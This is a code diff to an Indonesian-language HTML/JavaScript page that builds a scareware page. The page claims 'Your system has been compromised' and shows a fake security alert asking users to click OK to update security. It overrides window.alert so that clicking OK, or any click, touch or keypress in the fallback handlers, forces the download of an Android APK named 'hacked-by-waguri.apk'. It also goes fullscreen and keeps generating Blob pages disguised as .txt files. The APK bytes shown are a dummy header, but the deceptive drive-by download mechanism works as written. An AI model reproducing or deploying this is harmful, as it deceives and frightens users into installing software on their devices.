@@ -23,7 +23,7 @@ button:hover { background: #b71c1c; }
 <body>
 <div class="panel" id="main-panel">
 <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji MIME Sniffing).</p>
+<p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob HTML ber-ekstensi .txt secara terus-menerus (Uji Alert Hijacking).</p>
 
 <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
 
@@ -40,13 +40,13 @@ let activeUrls = [];
 let isProcessing = false;
 
 const speak = (message) => {
-if ('speechSynthesis' in window) {
-window.speechSynthesis.cancel();
-const utterance = new SpeechSynthesisUtterance(message);
-utterance.lang = 'id-ID';
-utterance.rate = 1.0;
-window.speechSynthesis.speak(utterance);
-}
+    if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(message);
+        utterance.lang = 'id-ID';
+        utterance.rate = 1.0;
+        window.speechSynthesis.speak(utterance);
+    }
 };
 
 const prepareMimeBlobAsync = (i) => {
@@ -61,7 +61,7 @@ const payloadText = "<!DOCTYPE html>" +
 "<h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0;margin-top:20px;letter-spacing:4px'>WAGURI</h2>" +
 "<p style='font-size:18px;color:#0f0;margin-top:40px;opacity:0.8'>Your system has been compromised.</p>" +
 "<p style='font-size:14px;color:#0f0;margin-top:10px;opacity:0.6' id='status'>Menyiapkan payload...</p>" +
-"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik di mana saja untuk memulai download</p>" +
+"<p style='font-size:14px;color:#ff0;margin-top:20px'>Klik OK pada alert untuk memulai download</p>" +
 "<p style='font-size:12px;color:#666;margin-top:60px'>Origin: <span id='o'></span></p>" +
 "</div>" +
 "<style>" +
@@ -72,7 +72,7 @@ const payloadText = "<!DOCTYPE html>" +
 "(function(){" +
 "\"use strict\";" +
 "document.getElementById('o').textContent = window.location.origin || 'null (file lokal)';" +
-"try { alert('HACKED BY WAGURI'); } catch(e){}" +
+
 "function b64KeBytes(b64){" +
 "var binary = atob(b64);" +
 "var len = binary.length;" +
@@ -82,13 +82,14 @@ const payloadText = "<!DOCTYPE html>" +
 "}" +
 "return bytes;" +
 "}" +
-// Payload APK (Header ZIP: PK\x03\x04 + dummy bytes diencode Base64)
+
+// Payload APK dummy (Header ZIP)
 "var b64Data = \"UEsDBAoAAAAAAAMAAAAEAAAAAAAAAAAAAAAQAAAA\" + " +
 "\"REVBUk1BTklGRVNUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
 "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
 "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
-"\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + " +
 "\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";" +
+
 "var sudah = false;" +
 "function picuDownload(){" +
 "if (sudah) return;" +
@@ -97,12 +98,11 @@ const payloadText = "<!DOCTYPE html>" +
 "try{" +
 "statusEl.textContent = 'Menyiapkan berkas...';" +
 "var bytesArr = b64KeBytes(b64Data);" +
-"// MIME type khusus Android Package" +
 "var blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });" +
 "var url = URL.createObjectURL(blob);" +
 "var a = document.createElement('a');" +
 "a.href = url;" +
-"a.download = 'hacked-by-waguri.apk';" + // Nama file .apk
+"a.download = 'hacked-by-waguri.apk';" +
 "a.style.display = 'none';" +
 "document.body.appendChild(a);" +
 "a.click();" +
@@ -118,10 +118,26 @@ const payloadText = "<!DOCTYPE html>" +
 "sudah = false;" +
 "}" +
 "}" +
-"window.addEventListener('load', function(){ setTimeout(picuDownload, 1500); });" +
+
+"// --- MEKANISME ALERT HIJACKING ---" +
+"var oldAlert = window.alert;" +
+"window.alert = function(msg) {" +
+"    // Tampilkan alert asli" +
+"    oldAlert(msg);" +
+"    // Begitu user klik OK, blokir kode di bawah ini langsung dieksekusi" +
+"    picuDownload();" +
+"};" +
+
+"// Trigger alert pertama saat halaman selesai dimuat" +
+"window.addEventListener('load', function(){ " +
+"    setTimeout(function(){" +
+"        alert('Peringatan Keamanan!\\n\\nSistem mendeteksi aktivitas mencurigakan. Klik OK untuk memperbarui keamanan.');" +
+"    }, 500); " +
+"});" +
+
+// Fallback jika alert diblokir oleh browser
 "document.addEventListener('click', picuDownload);" +
 "document.addEventListener('touchstart', picuDownload);" +
-"document.addEventListener('keydown', picuDownload);" +
 "})();" +
 "<\/script>" +
 "</body>" +
